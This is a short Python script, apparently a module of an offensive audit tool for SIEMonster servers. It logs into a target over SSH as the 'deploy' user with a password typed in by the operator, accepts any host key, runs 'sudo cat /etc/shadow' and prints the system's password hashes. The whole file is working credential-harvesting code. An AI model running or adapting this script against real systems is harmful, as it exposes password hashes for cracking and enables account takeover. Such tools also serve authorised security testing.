#!/usr/bin/env python3

# Obtain SO users of SIEMonster with SSH

# %%%%%%%%%%% Libraries %%%%%%%%%%%#

import globals
import paramiko
from colorama import Fore
from colorama import Style


# %%%%%%%%%% Functions %%%%%%%%%#


def smonster_users_server(ip):
    password = input(
        Fore.CYAN + Style.NORMAL + "[!] Enter SIEMonster deploy's password: "
        + Style.RESET_ALL)

    ssh = paramiko.SSHClient()
    ssh.load_system_host_keys()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(ip, username='deploy', password=password,
                    banner_timeout=200)
        std, stdout, stderr = ssh.exec_command("sudo cat /etc/shadow")
        std.flush()
        shadow_file = stdout.readlines()
        globals.smonster_messages(2)
        for line in shadow_file:
            print('[!] ' + line.replace('\n', ''))

        ssh.close()

    except paramiko.AuthenticationException:
        globals.messages(10)
        ssh.close()


# %%%%%%%%%% The End %%%%%%%%%%#
